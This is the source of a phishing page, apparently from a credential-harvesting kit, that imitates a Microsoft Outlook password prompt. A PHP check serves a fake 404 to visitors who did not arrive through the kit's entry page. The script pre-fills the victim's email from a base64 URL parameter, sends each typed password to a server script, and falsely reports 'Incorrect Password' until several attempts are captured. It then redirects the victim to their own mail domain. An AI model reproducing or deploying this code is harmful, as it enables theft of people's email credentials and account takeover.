<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Outlook Mail</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body id="office-body" class="c-div">
    <div id="main-outer-office" class="spdiv" style="max-width: 440px;width: 100%;height: 406px;margin-top: 100px;">
        <div id="form-outer-office" style="width: 100%;max-width: 440px;background: var(--bs-body-bg);padding: 44px;">
            <div id="pass-div-office">
                <div style="margin-right: 0px;margin-bottom: 16px;"><img src="../assets/img/lg.svg"></div>
                <p id="err" style="margin: 0px;margin-top: 12px;color: var(--bs-form-invalid-border-color);">Incorrect Password</p>
                <div class="s-div" style="height: 28px;padding: 2px;"><img src="../assets/img/barr.svg">
                    <p id="backEm" style="margin: 0px;"></p>
                </div>
                <div class="fw-semibold s-div" style="height: 38px;">
                    <p class="fw-semibold" style="font-size: 1.5rem;margin: 0px;">Enter password</p>
                </div><input type="password" id="pass" style="width: 100%;height: 36px;border-style: none;border-bottom-width: 1px;border-bottom-style: solid;margin-bottom: 18px;" placeholder="Password"><a class="dblock" href="#" style="color: #4291cf;font-size: 14px;margin-bottom: 16px;">Forgot password?</a>
                <div class="e-div"><button class="btn btn-primary" id="next-btn" type="button" style="width: 100%;max-width: 108px;height: 31px;padding: 0px;border-radius: 0px;background: #0067b8;border-style: none;border-bottom-style: none;" onclick="nextFun();">Sign In</button></div>
            </div>
        </div>
        <div id="b-div-office" class="s-div" style="height: 48px;background: var(--bs-body-bg);padding: 4px 44px;padding-top: 9px;padding-bottom: 9px;"><img src="../assets/img/k.svg" width="33" height="33">
            <p style="margin: 0px;margin-top: 4px;margin-left: 17px;">Sign in Options</p>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>